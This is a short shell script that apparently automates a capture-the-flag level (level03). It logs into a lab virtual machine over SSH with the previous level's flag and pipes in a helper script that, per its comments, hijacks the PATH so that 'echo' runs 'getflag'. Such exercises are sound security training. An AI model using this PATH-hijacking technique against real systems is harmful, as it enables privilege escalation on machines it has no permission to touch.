#!/bin/sh -eu

PREVIOUS_FLAG=../../level02/flag
ADDRESS=192.168.122.214
PORT=4242
FLAG=../flag

# Connect to the virtual machine using SSH and run the script
# to create a symbolic link and add it to the PATH,
# hacking the `echo` command to invoke the `getflag` command instead
sshpass -f ${PREVIOUS_FLAG} 2>/dev/null \
	ssh -p ${PORT} level03@${ADDRESS} 'sh -s' <invoke_getflag_via_echo.sh \
| grep -oE '[^ ]+$' >${FLAG}

exit 0
